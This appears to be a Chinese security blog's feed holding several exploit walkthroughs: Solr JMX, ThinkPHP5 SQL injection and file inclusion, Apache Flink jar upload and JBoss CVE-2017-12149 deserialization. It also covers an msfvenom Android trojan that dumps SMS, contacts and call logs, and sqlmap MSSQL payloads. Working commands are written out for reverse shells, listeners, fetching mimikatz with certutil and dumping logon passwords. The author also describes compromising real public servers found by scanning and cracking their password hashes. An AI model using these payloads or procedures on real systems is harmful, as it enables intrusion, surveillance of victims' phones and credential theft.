class="line"></span><br><span class="line">#设置监听</span><br><span class="line">set payload java/meterpreter/reverse_tcp</span><br><span class="line">set LHOST 192.168.43.141</span><br><span class="line">run</span><br></pre></td></tr></table></figure></p><p><img src="/2019/11/25/Apache-Solr-JMX服务远程代码执行复现/success.png" alt></p><p>虽然这个漏洞利用起来很方便的，但是影响范围比较小，其实也就两个版本可以利用，其他版本开启这个配置的几率也不高，留着以后有机会打吧。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;这个漏洞是由于配置的时候默认开启了JMX(版本8.1.1和8.2.0)&lt;br&gt;&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="漏洞复现" scheme="http://yoursite.com/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
  </entry>
  
  <entry>
    <title>Thinkphp5-文件包含</title>
    <link href="http://yoursite.com/2019/11/21/Thinkphp5-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"/>
    <id>http://yoursite.com/2019/11/21/Thinkphp5-文件包含/</id>
    <published>2019-11-21T02:06:24.000Z</published>
    <updated>2019-11-21T03:27:52.355Z</updated>
    
    <content type="html"><![CDATA[<p>漏洞影响版本： 5.0.0&lt;=ThinkPHP5&lt;=5.0.18 、5.1.0&lt;=ThinkPHP&lt;=5.1.10<br><a id="more"></a></p><h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p>composer<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">composer create-project --prefer-dist topthink/think=5.0.18 tpdemo</span><br></pre></td></tr></table></figure></p><p>然后修改其中的composer.json，修改require:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&quot;require&quot;: &#123;</span><br><span class="line">    &quot;php&quot;: &quot;&gt;=5.6.0&quot;,</span><br><span class="line">    &quot;topthink/framework&quot;: &quot;5.0.18&quot;</span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure></p><p>然后更新<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">composer update</span><br></pre></td></tr></table></figure></p><p>修改 <strong>application/index/controller/Index.php</strong> 文件<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">namespace app\index\controller;</span><br><span class="line">use think\Controller;</span><br><span class="line">class Index extends Controller</span><br><span class="line">&#123;</span><br><span class="line">    public function index()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;assign(request()-&gt;get());</span><br><span class="line">        return $this-&gt;fetch(); </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>创建 <strong>application/index/view/index/index.html</strong> ，内容啥都行，没有这个的话会报错，整了好久 ==</p><p>然后在public目录下新建一个test.php，内容：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">phpinfo();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p><p>访问url: <a href="http://127.0.0.1/tpdemo5.0.18/public/?cacheFile=test.php" target="_blank" rel="noopener">http://127.0.0.1/tpdemo5.0.18/public/?cacheFile=test.php</a><br><img src="/2019/11/21/Thinkphp5-文件包含/phpinfo.png" alt></p><p>这样就好了，接下来我们分析跟踪漏洞的成因</p><h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;漏洞影响版本： 5.0.0&amp;lt;=ThinkPHP5&amp;lt;=5.0.18 、5.1.0&amp;lt;=ThinkPHP&amp;lt;=5.1.10&lt;br&gt;&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="代码审计" scheme="http://yoursite.com/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>Thinkphp5-insert注入</title>
    <link href="http://yoursite.com/2019/11/20/Thinkphp5-insert%E6%B3%A8%E5%85%A5/"/>
    <id>http://yoursite.com/2019/11/20/Thinkphp5-insert注入/</id>
    <published>2019-11-20T12:10:35.000Z</published>
    <updated>2019-11-20T12:46:37.842Z</updated>
    
    <content type="html"><![CDATA[<p>跟着mochazz大佬的文章来的，原项目地址在这里：<a href="https://github.com/Mochazz/ThinkPHP-Vuln" title="https://github.com/Mochazz/ThinkPHP-Vuln" target="_blank" rel="noopener">ThinkPHP-Vuln</a></p><h1 id="漏洞介绍"><a href="#漏洞介绍" class="headerlink" title="漏洞介绍"></a>漏洞介绍</h1><p>漏洞成因：Build类中的parseData函数对用户的数据没有做任何的过滤，导致用户可直接构造sql语句造成注入<br>影响范围：5.0.13&lt;=ThinkPHP&lt;=5.0.15 、 5.1.0&lt;=ThinkPHP&lt;=5.1.5 </p><a id="more"></a><h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p>这里搞了好久，说一下流程</p><p>先要有mysql+php的环境(phpstudy或者linux下apt-get)</p><p>安装composer<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install composer</span><br></pre></td></tr></table></figure></p><p>然后获取我们的源码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">composer create-project --prefer-dist topthink/think=5.0.15 tpdemo</span><br></pre></td></tr></table></figure><p>获取的目录就在当前的文件夹下，然后开始配置<br>将 composer.json 文件的 require 字段设置成如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&quot;require&quot;: &#123;</span><br><span class="line">    &quot;php&quot;: &quot;&gt;=5.4.0&quot;,</span><br><span class="line">    &quot;topthink/framework&quot;: &quot;5.0.15&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>执行 composer update ，并将 application/index/controller/Index.php 文件代码设置如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">namespace app\index\controller;</span><br><span class="line"></span><br><span class="line">class Index</span><br><span class="line">&#123;</span><br><span class="line">    public function index()</span><br><span class="line">    &#123;</span><br><span class="line">        $username = request()-&gt;get(&apos;username/a&apos;);</span><br><span class="line">        db(&apos;users&apos;)-&gt;insert([&apos;username&apos; =&gt; $username]);</span><br><span class="line">        return &apos;Update success&apos;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>在 application/database.php 文件中配置数据库相关信息，并开启 application/config.php 中的 app_debug 和 app_trace 。创建数据库信息如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">create database tpdemo;</span><br><span class="line">use tpdemo;</span><br><span class="line">create table users(</span><br><span class="line">    id int primary key auto_increment,</span><br><span class="line">    username varchar(50) not null</span><br><span class="line">);</span><br></pre></td></tr></table></figure><p>访问我们的<br> <strong><a href="http://127.0.0.1/tpdemo/public/?username[0]=inc&amp;username[1]=updatexml(1,concat(0x7e,database(),0x7e),1)&amp;username[2]=1" target="_blank" rel="noopener">http://127.0.0.1/tpdemo/public/?username[0]=inc&amp;username[1]=updatexml(1,concat(0x7e,database(),0x7e),1)&amp;username[2]=1</a></strong></p><p><img src="/2019/11/20/Thinkphp5-insert注入/username.png" alt></p><p>访问成这样，说明搭建成功啦~</p><h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p>这里我使用了phpstorm来跟踪函数</p><p>首先我们来到 \application\index\controller\index.php<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">namespace app\index\controller;</span><br><span class="line"></span><br><span class="line">class Index</span><br><span class="line">&#123;</span><br><span class="line">    public function index()</span><br><span class="line">    &#123;</span><br><span class="line">        $username = request()-&gt;get(&apos;username/a&apos;);</span><br><span class="line">        db(&apos;users&apos;)-&gt;insert([&apos;username&apos; =&gt; $username]);</span><br><span class="line">        return &apos;Update success&apos;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>这里函数的大概意思是插入username，然后返回成功，这里我们跟踪insert函数</p><p>来到了 <strong>\thinkphp\library\think\db\Query.php</strong><br><img src="/2019/11/20/Thinkphp5-insert注入/insert.png" alt><br>看到2085这行代码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql = $this-&gt;builder-&gt;insert($data, $options, $replace);</span><br></pre></td></tr></table></figure></p><p>调用了builder中的insert函数，这里的 <strong>$this-&gt;builder</strong>类在 <strong>\thinkphplibrary\think\db\Builder.php</strong>，然后我们找到这个类中的insert函数。</p><p><img src="/2019/11/20/Thinkphp5-insert注入/parseData.png" alt><br>继续跟踪parseData这个函数<br><img src="/2019/11/20/Thinkphp5-insert注入/key.png" alt><br>这里的$data参数为数组，这里赋值给了数组$val，但我们$val[0]的值为 <strong>inc</strong> 的时候，<strong>$result[$item]</strong>的值为<br><strong>parseKey($val[1]) . ‘+’ . floatval($val[2]);</strong></p><p>我们继续跟踪这个parseKey函数，发现没有任何的过滤<br><img src="/2019/11/20/Thinkphp5-insert注入/parse.png" alt><br>然后这个没有过滤的参数值通过<strong>$result</strong> 变量最终还给了insert函数中的$data参数，最终insert函数返回了带有恶意代码的$sql<br><img src="/2019/11/20/Thinkphp5-insert注入/sql.png" alt></p><p>再然后给了我们最开始的insert方法带入去查询<br><img src="/2019/11/20/Thinkphp5-insert注入/return.png" alt></p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>1、这里第一个参数不仅仅可以为inc，看代码里面dec也可以利用<br><img src="/2019/11/20/Thinkphp5-insert注入/dec.png" alt></p><p>2、数组值必须为三个，缺少一个都不行<br><img src="/2019/11/20/Thinkphp5-insert注入/queshao.png" alt></p><p>大概就是总结这么多，明天再更新接下来的</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;跟着mochazz大佬的文章来的，原项目地址在这里：&lt;a href=&quot;https://github.com/Mochazz/ThinkPHP-Vuln&quot; title=&quot;https://github.com/Mochazz/ThinkPHP-Vuln&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;ThinkPHP-Vuln&lt;/a&gt;&lt;/p&gt;
&lt;h1 id=&quot;漏洞介绍&quot;&gt;&lt;a href=&quot;#漏洞介绍&quot; class=&quot;headerlink&quot; title=&quot;漏洞介绍&quot;&gt;&lt;/a&gt;漏洞介绍&lt;/h1&gt;&lt;p&gt;漏洞成因：Build类中的parseData函数对用户的数据没有做任何的过滤，导致用户可直接构造sql语句造成注入&lt;br&gt;影响范围：5.0.13&amp;lt;=ThinkPHP&amp;lt;=5.0.15 、 5.1.0&amp;lt;=ThinkPHP&amp;lt;=5.1.5 &lt;/p&gt;
    
    </summary>
    
    
    
      <category term="代码审计" scheme="http://yoursite.com/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>利用msf渗透Android手机</title>
    <link href="http://yoursite.com/2019/11/18/%E5%88%A9%E7%94%A8msf%E6%B8%97%E9%80%8FAndroid%E6%89%8B%E6%9C%BA/"/>
    <id>http://yoursite.com/2019/11/18/利用msf渗透Android手机/</id>
    <published>2019-11-18T05:48:18.000Z</published>
    <updated>2019-11-18T06:22:39.983Z</updated>
    
    <content type="html"><![CDATA[<h1 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h1><p>Kali:172.16.28.153<br>Android:172.16.28.158</p><a id="more"></a><p>首先用Msfvenom生成一个apk木马<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p android/meterpreter/reverse_tcp LHOST=172.16.105.184 LPORT=4444 R &gt; /root/apk.apk</span><br></pre></td></tr></table></figure></p><p><img src="/2019/11/18/利用msf渗透Android手机/apk.png" alt></p><p>然后msfconsole设置监听(默认监听端口4444)<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">use exploit/multi/handler</span><br><span class="line">set payload android/meterpreter/reverse_tcp</span><br><span class="line">set lhost 172.16.28.153</span><br><span class="line">run</span><br></pre></td></tr></table></figure></p><p>想办法让受害者点击这个木马apk，这里没有做免杀，手机肯定会报出病毒的警告</p><p><img src="/2019/11/18/利用msf渗透Android手机/meterpreter.png" alt></p><p>我们会拿到一个meterpreter，这里可以输入 help/? 来查看我们能够输入的命令<br><img src="/2019/11/18/利用msf渗透Android手机/core.png" alt></p><p>我们来测试几条经常使用的命令：<br>check_root //检测是否为root权限<br><img src="/2019/11/18/利用msf渗透Android手机/root.png" alt></p><p>webcam_snap    //通过摄像头拍照<br><img src="/2019/11/18/利用msf渗透Android手机/snap.png" alt></p><p>dump_calllog    //导出通话记录<br><img src="/2019/11/18/利用msf渗透Android手机/calllog.png" alt><br><img src="/2019/11/18/利用msf渗透Android手机/call.png" alt></p><p>dump_contacts    //导出通讯录<br><img src="/2019/11/18/利用msf渗透Android手机/concat.png" alt><br><img src="/2019/11/18/利用msf渗透Android手机/contact.png" alt></p><p>dump_sms    //导出短信内容<br><img src="/2019/11/18/利用msf渗透Android手机/sms.png" alt><br><img src="/2019/11/18/利用msf渗透Android手机/sms2.png" alt></p><p>app_list    //列出安装的app<br><img src="/2019/11/18/利用msf渗透Android手机/app.png" alt></p><p>还可以实时开启监控等命令，这里就不一一研究了</p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;实验环境&quot;&gt;&lt;a href=&quot;#实验环境&quot; class=&quot;headerlink&quot; title=&quot;实验环境&quot;&gt;&lt;/a&gt;实验环境&lt;/h1&gt;&lt;p&gt;Kali:172.16.28.153&lt;br&gt;Android:172.16.28.158&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="后渗透" scheme="http://yoursite.com/tags/%E5%90%8E%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>Apache Flink Jar包上传getshell漏洞</title>
    <link href="http://yoursite.com/2019/11/14/Apache-Flink-Jar%E5%8C%85%E4%B8%8A%E4%BC%A0getshell%E6%BC%8F%E6%B4%9E/"/>
    <id>http://yoursite.com/2019/11/14/Apache-Flink-Jar包上传getshell漏洞/</id>
    <published>2019-11-14T10:35:46.000Z</published>
    <updated>2019-11-14T12:36:22.761Z</updated>
    
    <content type="html"><![CDATA[<p>Apache Flink下载地址：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://mirrors.tuna.tsinghua.edu.cn/apache/flink/flink-1.9.1/flink-1.9.1-bin-scala_2.11.tgz</span><br></pre></td></tr></table></figure></p><a id="more"></a><p>解压，进入bin目录，运行start-cluster.sh<br><img src="/2019/11/14/Apache-Flink-Jar包上传getshell漏洞/start.png" alt></p><p>访问 <a href="http://ip:8081" target="_blank" rel="noopener">http://ip:8081</a></p><p><img src="/2019/11/14/Apache-Flink-Jar包上传getshell漏洞/dashboard.png" alt></p><p>Kali启动<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p java/meterpreter/reverse_tcp LHOST=192.168.43.128 LPORT=4444 -f jar &gt; rce.jar</span><br></pre></td></tr></table></figure></p><p>生成jar文件木马，上传<br><img src="/2019/11/14/Apache-Flink-Jar包上传getshell漏洞/submit.png" alt></p><p>msf打开监听<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line">set payload java/shell/reverse_tcp</span><br><span class="line">set LHOST 192.168.43.128</span><br><span class="line">run</span><br></pre></td></tr></table></figure></p><p>点击控制台里面的submit，看见shell反弹回来啦<br><img src="/2019/11/14/Apache-Flink-Jar包上传getshell漏洞/shell.png" alt></p><p>不过msf这里只有内网环境，刚好前两天小伙伴分享了frp内网穿透，就去配置了一下，然后在公网上找到了一个可以利用的点<br><img src="/2019/11/14/Apache-Flink-Jar包上传getshell漏洞/ip.png" alt></p><p>还尼玛是root权限，这个漏洞危害真的高，可惜公网数量太少了<br><img src="/2019/11/14/Apache-Flink-Jar包上传getshell漏洞/shadow.png" alt></p><p>看到hash之后，用Kali下的john爆破</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Apache Flink下载地址：&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;https://mirrors.tuna.tsinghua.edu.cn/apache/flink/flink-1.9.1/flink-1.9.1-bin-scala_2.11.tgz&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="漏洞复现" scheme="http://yoursite.com/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
  </entry>
  
  <entry>
    <title>JBoss AS 6.X 反序列化漏洞+getshell+实战(CVE-2017-12149)</title>
    <link href="http://yoursite.com/2019/11/11/JBosS-AS-6-X-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-CVE-2017-12149/"/>
    <id>http://yoursite.com/2019/11/11/JBosS-AS-6-X-反序列化漏洞-CVE-2017-12149/</id>
    <published>2019-11-11T04:22:06.000Z</published>
    <updated>2019-11-11T08:05:10.397Z</updated>
    
    <content type="html"><![CDATA[<h1 id="漏洞介绍"><a href="#漏洞介绍" class="headerlink" title="漏洞介绍"></a>漏洞介绍</h1><p>CVE编号：CVE-2017-12149<br>影响版本：影响版本为JBoss5.x-6.x<br>漏洞描述：JBOSSApplication Server反序列化命令执行漏洞(CVE-2017-12149)，远程攻击者利用漏洞可在未经任何身份验证的服务器主机上执行任意代码。漏洞危害程度为高危(High)。</p><a id="more"></a><h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><p>(Kali上一直复现不成功，这里我就用了两台ubuntu做实验)<br>攻击目标：192.168.43.131<br>攻击机器：192.168.43.140</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">JBOSS 下载地址：http://download.jboss.org/jbossas/6.1/jboss-as-distribution-6.1.0.Final.zip</span><br></pre></td></tr></table></figure><p>解压，编辑：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jboss-6.1.0.Final/server/default/deploy/jbossweb.sar/server.xml</span><br></pre></td></tr></table></figure></p><p>设置为允许远程访问<br><img src="/2019/11/11/JBosS-AS-6-X-反序列化漏洞-CVE-2017-12149/xml.png" alt></p><p>用nmap扫描服务器，发现8080端口<br><img src="/2019/11/11/JBosS-AS-6-X-反序列化漏洞-CVE-2017-12149/nmap.png" alt></p><p>访问 <strong><a href="http://192.168.43.131:8080" target="_blank" rel="noopener">http://192.168.43.131:8080</a></strong><br><img src="/2019/11/11/JBosS-AS-6-X-反序列化漏洞-CVE-2017-12149/8080.png" alt><br>长这个样子</p><p>然后访问 <strong>/invoker/readonly</strong> 这个位置<br><img src="/2019/11/11/JBosS-AS-6-X-反序列化漏洞-CVE-2017-12149/invoke.png" alt><br>返回500证明存在漏洞</p><p>首先用java的利用工具验证一下<br><img src="/2019/11/11/JBosS-AS-6-X-反序列化漏洞-CVE-2017-12149/linux.png" alt></p><p>这里可以执行命令了，但是还不能反弹shell</p><h1 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h1><p><a href="https://github.com/joaomatosf/JavaDeserH2HC" target="_blank" rel="noopener">https://github.com/joaomatosf/JavaDeserH2HC</a><br>下载这个JavaDeserH2HC工具，解压，进入目录下，然后运行<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">javac -cp .:commons-collections-3.2.1.jar ReverseShellCommonsCollectionsHashMap.java</span><br><span class="line"></span><br><span class="line">java -cp .:commons-collections-3.2.1.jar ReverseShellCommonsCollectionsHashMap targetip:port</span><br></pre></td></tr></table></figure></p><p>在本地监听端口：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvp 12345</span><br></pre></td></tr></table></figure></p><p>然后运行：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://target:8080/invoker/readonly --data-binary @ReverseShellCommonsCollectionsHashMap.ser</span><br></pre></td></tr></table></figure></p><p><img src="/2019/11/11/JBosS-AS-6-X-反序列化漏洞-CVE-2017-12149/shell.png" alt><br>拿到shell</p><p>fofa一下的成果<br><img src="/2019/11/11/JBosS-AS-6-X-反序列化漏洞-CVE-2017-12149/ali.png" alt></p><p>然后发现就是system权限哦，服务器搭建一个apache，上传mimikatz<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">certutil.exe -urlcache -split -f http://xxxxx/mimikatz.exe</span><br><span class="line"></span><br><span class="line">mimikatz # privilege::debug</span><br><span class="line">Privilege &apos;20&apos; OK</span><br><span class="line"></span><br><span class="line">mimikatz # sekurlsa::logonpasswords</span><br></pre></td></tr></table></figure></p><p><img src="/2019/11/11/JBosS-AS-6-X-反序列化漏洞-CVE-2017-12149/mimikatz.png" alt><br><img src="/2019/11/11/JBosS-AS-6-X-反序列化漏洞-CVE-2017-12149/3389.png" alt></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;漏洞介绍&quot;&gt;&lt;a href=&quot;#漏洞介绍&quot; class=&quot;headerlink&quot; title=&quot;漏洞介绍&quot;&gt;&lt;/a&gt;漏洞介绍&lt;/h1&gt;&lt;p&gt;CVE编号：CVE-2017-12149&lt;br&gt;影响版本：影响版本为JBoss5.x-6.x&lt;br&gt;漏洞描述：JBOSSApplication Server反序列化命令执行漏洞(CVE-2017-12149)，远程攻击者利用漏洞可在未经任何身份验证的服务器主机上执行任意代码。漏洞危害程度为高危(High)。&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="漏洞复现" scheme="http://yoursite.com/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
  </entry>
  
  <entry>
    <title>通过sqlmap学习mssql注入</title>
    <link href="http://yoursite.com/2019/11/10/%E5%A6%82%E4%BD%95%E9%80%9A%E8%BF%87sqlmap%E5%AD%A6%E4%B9%A0mssql%E6%B3%A8%E5%85%A5/"/>
    <id>http://yoursite.com/2019/11/10/如何通过sqlmap学习mssql注入/</id>
    <published>2019-11-10T07:21:52.000Z</published>
    <updated>2019-11-11T05:42:16.189Z</updated>
    
    <content type="html"><![CDATA[<p>实验环境：<br>windows 2008 + sql server 2008 + IIS7.5<br><a id="more"></a></p><h1 id="mysql和mssql注入"><a href="#mysql和mssql注入" class="headerlink" title="mysql和mssql注入"></a>mysql和mssql注入</h1><p>之前写过一篇<a href="https://mp.weixin.qq.com/s/jVN48BRYb9pECjk9SAuXpA" title="https://mp.weixin.qq.com/s/jVN48BRYb9pECjk9SAuXpA" target="_blank" rel="noopener">聊一聊 SQLMAP 在进行 sql 注入时的整个流程</a>，文中主要介绍了mysql环境下sqlmap注入的整体流程。对于mssql的注入，sqlmap其实也是换汤不换药，整体流程我会在接下来的文章中一一道出。</p><h1 id="判断注入类型"><a href="#判断注入类型" class="headerlink" title="判断注入类型"></a>判断注入类型</h1><p>sqlmap判断依然是按照下面几个点来进行的：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">--technique=TECH..  SQL injection techniques to use (default &quot;BEUSTQ&quot;)</span><br><span class="line">B: Boolean-based blind SQL injection（布尔型注入）</span><br><span class="line">E: Error-based SQL injection（报错型注入）</span><br><span class="line">U: UNION query SQL injection（可联合查询注入）</span><br><span class="line">S: Stacked queries SQL injection（可多语句查询注入）</span><br><span class="line">T: Time-based blind SQL injection（基于时间延迟注入）</span><br><span class="line">Q: inline_query SQL injection(内联注入)</span><br></pre></td></tr></table></figure></p><p>我将注入点扔进sqlmap，判断出的注入类型：<br><img src="/2019/11/10/如何通过sqlmap学习mssql注入/panduan.png" alt></p><h1 id="判断基本信息"><a href="#判断基本信息" class="headerlink" title="判断基本信息"></a>判断基本信息</h1><p>为了方便查看sql语句，这里用burp suite设置代理抓包，sqlmap中添加参数：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">--proxy=&apos;http://127.0.0.1:8080&apos;</span><br></pre></td></tr></table></figure></p><h2 id="基本信息查询"><a href="#基本信息查询" class="headerlink" title="基本信息查询"></a>基本信息查询</h2><p>首先我们来看下当前的用户<br><img src="/2019/11/10/如何通过sqlmap学习mssql注入/currentuser.png" alt><br>判断出来用户为sa，我这里将payload解码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1 UNION ALL SELECT NULL,CHAR(113)+CHAR(113)+CHAR(106)+CHAR(98)+CHAR(113)+ISNULL(CAST(SYSTEM_USER AS NVARCHAR(4000)),CHAR(32))+CHAR(113)+CHAR(98)+CHAR(118)+CHAR(122)+CHAR(113),NULL-- mJCg</span><br></pre></td></tr></table></figure></p><p>这里可以看出sqlmap利用了联合查询注入的方式，我们将他分解开来<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#首先可以看出sqlmap是判断出列的数量为3</span><br><span class="line">id=1 UNION ALL SELECT NULL,NULL,NULL--</span><br><span class="line">#然后将第二个NULL的值替换成</span><br><span class="line">CHAR(113)+CHAR(113)+CHAR(106)+CHAR(98)+CHAR(113)+ISNULL(CAST(SYSTEM_USER AS NVARCHAR(4000)),CHAR(32))+CHAR(113)+CHAR(98)+CHAR(118)+CHAR(122)+CHAR(113)</span><br></pre></td></tr></table></figure></p><p>我们再次分解这个NULL的值<br><img src="/2019/11/10/如何通过sqlmap学习mssql注入/char.png" alt><br><img src="/2019/11/10/如何通过sqlmap学习mssql注入/sa.png" alt><br>关键能查出信息的还是ISNULL这句话<br><img src="/2019/11/10/如何通过sqlmap学习mssql注入/isnull.png" alt><br><img src="/2019/11/10/如何通过sqlmap学习mssql注入/cast.png" alt><br>所以这里首先是将 <strong>SYSTEM_USER</strong> 转换成了char类型，这个时候ISNULL中的两个value都是char，然后就会返回第一个的值，也就是我们的SYSTEM_USER<br><img src="/2019/11/10/如何通过sqlmap学习mssql注入/cast.png" alt><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1 UNION ALL SELECT NULL,CHAR(113)+CHAR(113)+CHAR(106)+CHAR(98)+CHAR(113)+ISNULL(CAST(DB_NAME() AS NVARCHAR(4000)),CHAR(32))+CHAR(113)+CHAR(98)+CHAR(118)+CHAR(122)+CHAR(113),NULL-- zZox</span><br></pre></td></tr></table></figure></p><p>同理sqlmap还可以查询(替换SYSTEM_USER)<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">DB_NAME()//当前数据库</span><br><span 